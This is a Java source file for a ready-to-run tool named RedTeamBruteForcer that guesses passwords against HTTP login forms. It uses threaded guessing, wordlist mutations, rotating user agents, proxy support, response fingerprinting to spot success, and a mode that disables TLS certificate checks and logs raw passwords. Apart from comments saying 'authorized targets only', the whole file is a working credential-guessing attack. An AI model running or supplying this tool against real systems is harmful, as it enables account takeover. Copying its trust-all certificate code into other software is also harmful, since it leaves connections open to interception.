// RedTeamBruteForcer.java
import java.io.*;
import java.net.*;
import java.net.http.*;
import java.net.http.HttpClient.Redirect;
import java.net.http.HttpClient.Version;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import java.time.Duration;
import java.time.Instant;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.*;
import java.util.stream.Collectors;

import javax.net.ssl.*;

/**
 * RedTeamBruteForcer - debugged version with verbose mode and fixes for
 * typical "no output after start" conditions.
 *
 * IMPORTANT: Run only on authorized targets.
 */
public class RedTeamBruteForcer {
    private static final int DEFAULT_THREADS = 12;
    private static final int DEFAULT_RATE_PER_SECOND = 10;
    private static final String LOG_JSONL = "brute_results.jsonl";
    private static final String REPORT_TXT = "brute_report.txt";

    private static final String ANSI_RESET = "\u001B[0m";
    private static final String ANSI_GREEN = "\u001B[32m";
    private static final String ANSI_CYAN = "\u001B[36m";
    private static final String ANSI_YELLOW = "\u001B[33m";
    private static final String ANSI_RED = "\u001B[31m";

    private final AtomicBoolean found = new AtomicBoolean(false);
    private final AtomicInteger attempts = new AtomicInteger(0);
    private final AtomicInteger successes = new AtomicInteger(0);
    private final BlockingQueue<String> logQueue = new LinkedBlockingQueue<>();
    private final List<String> responseFingerprints = Collections.synchronizedList(new ArrayList<>());

    private final ExecutorService workers;
    private final Thread logWriterThread;
    private final HttpClient client;
    private final TokenBucket rateLimiter;
    private final Instant startTime = Instant.now();
    private final boolean labMode;
    private final boolean verbose;

    public RedTeamBruteForcer(int threads, int ratePerSecond, boolean labMode, boolean verbose, ProxySelector proxySelector, Optional<Authenticator> authenticator) throws Exception {
        this.labMode = labMode;
        this.verbose = verbose;
        this.rateLimiter = new TokenBucket(ratePerSecond, ratePerSecond);
        this.workers = Executors.newFixedThreadPool(threads);

        HttpClient.Builder b = HttpClient.newBuilder()
                .version(Version.HTTP_1_1)
                .followRedirects(Redirect.NORMAL)
                .connectTimeout(Duration.ofSeconds(8))
                // DO NOT set .executor(workers) — use default executor for HttpClient
                .proxy(proxySelector);

        authenticator.ifPresent(b::authenticator);

        if (labMode) {
            disableSSLVerification();
            if (verbose) System.out.println("[DEBUG] Lab mode: SSL verification disabled");
        }

        this.client = b.build();

        this.logWriterThread = new Thread(this::logWriterLoop, "log-writer");
        this.logWriterThread.setDaemon(true);
        this.logWriterThread.start();

        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            System.out.println(ANSI_YELLOW + "\nShutdown requested — flushing logs and stopping..." + ANSI_RESET);
            shutdown();
        }));
    }

    private static void disableSSLVerification() throws Exception {
        SSLContext sslContext = SSLContext.getInstance("TLS");
        TrustManager[] trustAll = new TrustManager[] {
            new X509TrustManager() {
                public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
                public void checkClientTrusted(X509Certificate[] certs, String authType) { }
                public void checkServerTrusted(X509Certificate[] certs, String authType) { }
            }
        };
        sslContext.init(null, trustAll, new SecureRandom());
        HttpsURLConnection.setDefaultSSLSocketFactory(sslContext.getSocketFactory());
        HttpsURLConnection.setDefaultHostnameVerifier((h, s) -> true);
    }

    private void logWriterLoop() {
        try (PrintWriter pw = new PrintWriter(new FileWriter(LOG_JSONL, true))) {
            while (!Thread.currentThread().isInterrupted()) {
                String line = logQueue.poll(2, TimeUnit.SECONDS);
                if (line != null) {
                    pw.println(line);
                    pw.flush();
                } else {
                    if (workers instanceof ThreadPoolExecutor) {
                        if (((ThreadPoolExecutor) workers).isTerminated() && logQueue.isEmpty()) {
                            break;
                        }
                    }
                }
            }
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        } catch (IOException ioe) {
            System.err.println("Log writer I/O error: " + ioe.getMessage());
        }
    }

    public void shutdown() {
        try {
            rateLimiter.shutdown();
            workers.shutdownNow();
            logWriterThread.interrupt();
            try { logWriterThread.join(2000); } catch (InterruptedException ignored) {}
            writeReport();
        } catch (Exception e) {
            // ignore
        }
    }

    public void runAttack(String targetUrl, String username, List<String> passwordList, boolean useMutations, int stopAfterFound) {
        printBanner();

        System.out.println(ANSI_CYAN + "Capturing baseline response fingerprint..." + ANSI_RESET);
        try {
            String baseFinger = captureBaselineFingerprint(targetUrl, username);
            if (baseFinger != null) {
                responseFingerprints.add(baseFinger);
                System.out.println("  Baseline fingerprint: " + baseFinger);
            }
        } catch (Exception e) {
            System.out.println(ANSI_YELLOW + "  Baseline capture failed: " + e.getMessage() + ANSI_RESET);
        }

        List<String> streamPasswords = useMutations ? passwordList.stream()
                .flatMap(pw -> mutate(pw).stream())
                .collect(Collectors.toList())
                : new ArrayList<>(passwordList);

        final int total = streamPasswords.size();
        System.out.println(ANSI_CYAN + "Starting attack: " + total + " attempts maximum across threads." + ANSI_RESET);

        // If verbose is false and the password list is small, print header.
        if (!verbose && total <= 50) {
            System.out.println("[INFO] Small run — progress prints will appear periodically.");
        }

        for (String password : streamPasswords) {
            if (found.get() && stopAfterFound > 0 && successes.get() >= stopAfterFound) break;
            rateLimiter.acquire();

            workers.submit(() -> {
                int attemptNo = attempts.incrementAndGet();
                if (verbose) System.out.println("[ATTEMPT] #" + attemptNo + " -> " + mask(password));
                Instant t0 = Instant.now();
                AttackResult res;
                try {
                    res = tryLogin(targetUrl, username, password);
                } catch (Exception e) {
                    long dur = Duration.between(t0, Instant.now()).toMillis();
                    res = new AttackResult(-1, "", dur, e.getMessage());
                    // Print exception to console for debug visibility
                    System.err.println(ANSI_RED + "[ERROR] attempt#" + attemptNo + " exception: " + e.getMessage() + ANSI_RESET);
                    if (verbose) {
                        e.printStackTrace(System.err);
                    }
                }

                Map<String,Object> rec = new LinkedHashMap<>();
                rec.put("timestamp", Instant.now().toString());
                rec.put("attempt", attemptNo);
                rec.put("username", username);
                rec.put("password_masked", mask(password));
                rec.put("password_raw", labMode ? password : "REDACTED");
                rec.put("status", res.body);
                rec.put("code", res.code);
                rec.put("latency_ms", res.latencyMs);
                rec.put("note", res.note);
                rec.put("target", targetUrl);

                logQueue.offer(toJson(rec));

                if (!responseFingerprints.isEmpty()) {
                    String fp = fingerprintFromResponse(res);
                    if (!responseFingerprints.contains(fp)) {
                        logQueue.offer(toJson(Map.of(
                            "timestamp", Instant.now().toString(),
                            "event", "fingerprint_anomaly",
                            "attempt", attemptNo,
                            "fingerprint", fp
                        )));
                    }
                }

                boolean isSuccess = (res.code == 200 && probableSuccessFromBody(res.body)) ||
                                    (res.code > 0 && !responseFingerprints.isEmpty() && !responseFingerprints.contains(fingerprintFromResponse(res)));

                if (isSuccess) {
                    successes.incrementAndGet();
                    found.set(true);
                    System.out.println(ANSI_GREEN + "[SUCCESS] Attempt#" + attemptNo + " => password: " + (labMode ? password : mask(password)) + ANSI_RESET);
                }

                if (attemptNo % Math.max(1, Math.min(25, total / 10)) == 0 || isSuccess) {
                    printProgress(attemptNo, total);
                }
            });
        }

        workers.shutdown();
        try {
            if (!workers.awaitTermination(30, TimeUnit.MINUTES)) {
                System.out.println(ANSI_YELLOW + "Timed out waiting for tasks; forcing shutdown." + ANSI_RESET);
                workers.shutdownNow();
            }
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }

        try { Thread.sleep(500); } catch (InterruptedException ignored) {}
        writeReport();
        System.out.println(ANSI_CYAN + "Run complete. Logs: " + LOG_JSONL + ", Report: " + REPORT_TXT + ANSI_RESET);
    }

    // --- utilities ---
    private static String toJson(Map<?,?> m) {
        StringBuilder sb = new StringBuilder("{");
        boolean first = true;
        for (Map.Entry<?,?> e : m.entrySet()) {
            if (!first) sb.append(",");
            first = false;
            sb.append("\"").append(escapeJson(String.valueOf(e.getKey()))).append("\":");
            Object v = e.getValue();
            if (v == null) sb.append("null");
            else if (v instanceof Number || v instanceof Boolean) sb.append(v.toString());
            else sb.append("\"").append(escapeJson(String.valueOf(v))).append("\"");
        }
        sb.append("}");
        return sb.toString();
    }

    private static String escapeJson(String s) {
        return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r");
    }

    private String mask(String s) {
        if (s == null) return "NULL";
        if (s.length() <= 4) return "****";
        return s.substring(0,2) + "****" + s.substring(s.length()-2);
    }

    private boolean probableSuccessFromBody(String body) {
        if (body == null || body.isBlank()) return false;
        String b = body.toLowerCase();
        return b.contains("welcome") || b.contains("dashboard") || b.contains("sign out") || b.contains("logout") || b.contains("account");
    }

    private String fingerprintFromResponse(AttackResult res) {
        String body = res.body == null ? "" : res.body;
        int h = body.length();
        if (!body.isEmpty()) h += Objects.hashCode(body.substring(0, Math.min(50, body.length())));
        return res.code + ":" + h;
    }

    private AttackResult tryLogin(String url, String username, String password) throws Exception {
        String form = "username=" + URLEncoder.encode(username, StandardCharsets.UTF_8)
                    + "&password=" + URLEncoder.encode(password, StandardCharsets.UTF_8);
        HttpRequest req = HttpRequest.newBuilder()
                .uri(new URI(url))
                .header("Content-Type", "application/x-www-form-urlencoded")
                .header("User-Agent", randomUserAgent())
                .timeout(Duration.ofSeconds(12))
                .POST(HttpRequest.BodyPublishers.ofString(form))
                .build();

        Instant t0 = Instant.now();
        HttpResponse<String> resp;
        try {
            resp = client.send(req, HttpResponse.BodyHandlers.ofString());
        } catch (IOException | InterruptedException e) {
            return new AttackResult(-1, "", Duration.between(t0, Instant.now()).toMillis(), e.getMessage());
        }
        long elapsed = Duration.between(t0, Instant.now()).toMillis();
        return new AttackResult(resp.statusCode(), resp.body(), elapsed, null);
    }

    private String captureBaselineFingerprint(String url, String username) throws Exception {
        AttackResult r = tryLogin(url, username, "INVALID_PASSWORD_BASELINE_12345");
        return fingerprintFromResponse(r);
    }

    private static String randomUserAgent() {
        String[] agents = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0"
        };
        return agents[new Random().nextInt(agents.length)];
    }

    private static Set<String> mutate(String original) {
        Set<String> out = new LinkedHashSet<>();
        out.add(original);
        out.add(original + "1");
        out.add(original + "123");
        out.add(original.toUpperCase());
        out.add(capitalize(original));
        out.add(leetspeak(original));
        out.add(original + "!");
        return out;
    }

    private static String capitalize(String s) {
        if (s == null || s.isEmpty()) return s;
        return Character.toUpperCase(s.charAt(0)) + s.substring(1);
    }

    private static String leetspeak(String s) {
        if (s == null) return s;
        return s.replace('a','@').replace('A','@').replace('o','0').replace('O','0').replace('e','3').replace('l','1');
    }

    private void printBanner() {
        String threads = (workers instanceof ThreadPoolExecutor) ? String.valueOf(((ThreadPoolExecutor)workers).getCorePoolSize()) : "N/A";
        System.out.println(ANSI_CYAN +
            "==============================================\n" +
            "  RedTeamBruteForcer — authorized training tool\n" +
            "  Threads: " + threads + ", Rate: " + rateLimiter.getRate() + " req/s\n" +
            "==============================================\n" + ANSI_RESET);
    }

    private void printProgress(int done, int total) {
        long elapsedSec = Math.max(1, Duration.between(startTime, Instant.now()).getSeconds());
        double rps = (double) done / elapsedSec;
        String progress = String.format("%sProgress:%s %d/%d | attempts/s=%.2f | successes=%d",
                ANSI_YELLOW, ANSI_RESET, done, total, rps, successes.get());
        System.out.println(progress);
    }

    private void writeReport() {
        try (PrintWriter pw = new PrintWriter(new FileWriter(REPORT_TXT))) {
            pw.println("RedTeamBruteForcer - Run Report");
            pw.println("Started: " + startTime);
            pw.println("Finished: " + Instant.now());
            pw.println("Total attempts: " + attempts.get());
            pw.println("Successes: " + successes.get());
            pw.println("Elapsed: " + Duration.between(startTime, Instant.now()).toString());
            pw.println("Fingerprints seen: " + responseFingerprints.toString());
            pw.println("Notes: Run only on authorized targets.");
        } catch (IOException e) {
            System.err.println("Error writing report: " + e.getMessage());
        }
    }

    private static class AttackResult {
        final int code;
        final String body;
        final long latencyMs;
        final String note;
        AttackResult(int code, String body, long latencyMs, String note) {
            this.code = code;
            this.body = body;
            this.latencyMs = latencyMs;
            this.note = note;
        }
    }

    // token bucket remains similar
    private static class TokenBucket {
        private final int capacity;
        private final int ratePerSec;
        private final AtomicInteger tokens;
        private final ScheduledExecutorService refillService = Executors.newSingleThreadScheduledExecutor();

        TokenBucket(int ratePerSec, int capacity) {
            this.ratePerSec = Math.max(1, ratePerSec);
            this.capacity = Math.max(1, capacity);
            tokens = new AtomicInteger(this.capacity);
            refillService.scheduleAtFixedRate(() -> {
                int before = tokens.get();
                int after = Math.min(capacity, before + this.ratePerSec);
                tokens.set(after);
            }, 0, 1, TimeUnit.SECONDS);
        }

        void acquire() {
            int tries = 0;
            while (true) {
                int t = tokens.get();
                if (t > 0 && tokens.compareAndSet(t, t - 1)) return;
                tries++;
                // brief sleep; in verbose mode callers provide debug output
                try { Thread.sleep(20 + new Random().nextInt(40)); } catch (InterruptedException e) { Thread.currentThread().interrupt(); return; }
                if (tries % 50 == 0) {
                    // avoid silent long-blocks: inform user occasionally
                    System.out.print("."); System.out.flush();
                }
            }
        }

        int getRate() { return ratePerSec; }
        void shutdown() { refillService.shutdownNow(); }
    }

    // ==== CLI ====
    public static void main(String[] args) throws Exception {
        System.out.println(ANSI_CYAN + "RedTeamBruteForcer starting..." + ANSI_RESET);
        Scanner scanner = new Scanner(System.in);

        System.out.print("Target URL (e.g. https://lab.example/login): ");
        String url = scanner.nextLine().trim();

        System.out.print("Username: ");
        String username = scanner.nextLine().trim();

        System.out.print("Password list file path: ");
        String passPath = scanner.nextLine().trim();

        System.out.print("Threads [enter for " + DEFAULT_THREADS + "]: ");
        String tStr = scanner.nextLine().trim();
        int threads = tStr.isEmpty() ? DEFAULT_THREADS : Integer.parseInt(tStr);

        System.out.print("Rate (req/sec) [enter for " + DEFAULT_RATE_PER_SECOND + "]: ");
        String rStr = scanner.nextLine().trim();
        int rate = rStr.isEmpty() ? DEFAULT_RATE_PER_SECOND : Integer.parseInt(rStr);

        System.out.print("Verbose mode? (prints per-attempt info) (y/n): ");
        boolean verbose = scanner.nextLine().trim().equalsIgnoreCase("y");

        System.out.print("Use proxy? (y/n): ");
        boolean useProxy = scanner.nextLine().trim().equalsIgnoreCase("y");
        ProxySelector proxySelector = ProxySelector.getDefault();
        Optional<Authenticator> auth = Optional.empty();

        if (useProxy) {
            System.out.print("Proxy host: ");
            String ph = scanner.nextLine().trim();
            System.out.print("Proxy port: ");
            int pp = Integer.parseInt(scanner.nextLine().trim());
            ProxySelector ps = new ProxySelector() {
                @Override
                public List<Proxy> select(URI uri) {
                    return List.of(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(ph, pp)));
                }
                @Override
                public void connectFailed(URI uri, SocketAddress sa, IOException ioe) {
                    System.err.println("Proxy connection failed: " + ioe.getMessage());
                }
            };
            proxySelector = ps;

            System.out.print("Proxy requires auth? (y/n): ");
            if (scanner.nextLine().trim().equalsIgnoreCase("y")) {
                System.out.print("Proxy user: ");
                String pu = scanner.nextLine().trim();
                System.out.print("Proxy pass: ");
                String ppw = scanner.nextLine().trim();
                auth = Optional.of(new Authenticator() {
                    @Override
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(pu, ppw.toCharArray());
                    }
                });
            }
        }

        System.out.print("Use password mutations? (y/n): ");
        boolean mutate = scanner.nextLine().trim().equalsIgnoreCase("y");

        System.out.print("Lab mode? (lab mode disables cert checks, enables raw password logging) (y/n): ");
        boolean labMode = scanner.nextLine().trim().equalsIgnoreCase("y");

        System.out.print("Stop after first success? (y/n): ");
        boolean stopAfter = scanner.nextLine().trim().equalsIgnoreCase("y");

        List<String> passwords = readPasswordFile(passPath);
        if (passwords.isEmpty()) {
            System.err.println("No passwords loaded. Exiting.");
            return;
        }

        // Quick reachable URL smoke-test advice (printed but not enforced)
        System.out.println("[TIP] If target is remote, ensure network/proxy are reachable from this machine.");

        RedTeamBruteForcer tool = new RedTeamBruteForcer(threads, rate, labMode, verbose, proxySelector, auth);
        tool.runAttack(url, username, passwords, mutate, stopAfter ? 1 : 0);
    }

    private static List<String> readPasswordFile(String path) {
        List<String> out = new ArrayList<>();
        try (BufferedReader r = new BufferedReader(new FileReader(path))) {
            String line;
            while ((line = r.readLine()) != null) {
                line = line.trim();
                if (!line.isEmpty()) out.add(line);
            }
        } catch (IOException e) {
            System.err.println("Error reading password file: " + e.getMessage());
        }
        return out;
    }
}
